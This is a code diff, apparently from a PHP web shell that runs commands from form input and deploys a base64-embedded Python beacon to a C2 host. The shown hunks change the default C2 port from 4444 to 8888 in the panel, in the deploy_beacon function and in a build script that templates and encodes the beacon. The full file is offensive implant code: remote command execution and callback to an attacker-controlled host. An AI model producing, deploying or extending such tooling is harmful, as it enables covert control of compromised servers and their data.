@@ -24,7 +24,7 @@ function exec_cmd($cmd) {
 }
 
 $c2_host = isset($_POST['c2_host']) ? $_POST['c2_host'] : (isset($_GET['c2_host']) ? $_GET['c2_host'] : '192.168.163.1');
-$c2_port = isset($_POST['c2_port']) ? intval($_POST['c2_port']) : (isset($_GET['c2_port']) ? intval($_GET['c2_port']) : 4444);
+$c2_port = isset($_POST['c2_port']) ? intval($_POST['c2_port']) : (isset($_GET['c2_port']) ? intval($_GET['c2_port']) : 8888);
 
 $cmd_result = '';
 if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '') {
@@ -36,7 +36,7 @@ if (isset($_POST['deploy'])) {
     $deploy_msg = deploy_beacon($c2_host, $c2_port);
 }
 
-function deploy_beacon($c2_host = '192.168.163.1', $c2_port = 4444) {
+function deploy_beacon($c2_host = '192.168.163.1', $c2_port = 8888) {
     // Beacon 源码以 base64 形式内嵌, 部署时解码, 避免 heredoc 转义破坏 Python 语法
     $beacon_b64 = 'BASE64_PLACEHOLDER';
 
@@ -140,7 +140,7 @@ with io.open(SRC_BEACON, 'r', encoding='utf-8') as f:
 
 # 将默认值替换为占位符，部署时由表单值填充
 beacon = beacon.replace("C2_HOST = '192.168.163.1'", "C2_HOST = '{C2_HOST}'")
-beacon = beacon.replace("C2_PORT = 4444", "C2_PORT = {C2_PORT}")
+beacon = beacon.replace("C2_PORT = 8888", "C2_PORT = {C2_PORT}")
 
 # base64 编码（utf-8 -> base64）。base64 仅含 [A-Za-z0-9+/=]，无任何会被 PHP 转义的字符。
 beacon_b64 = base64.b64encode(beacon.encode('utf-8')).decode('ascii')
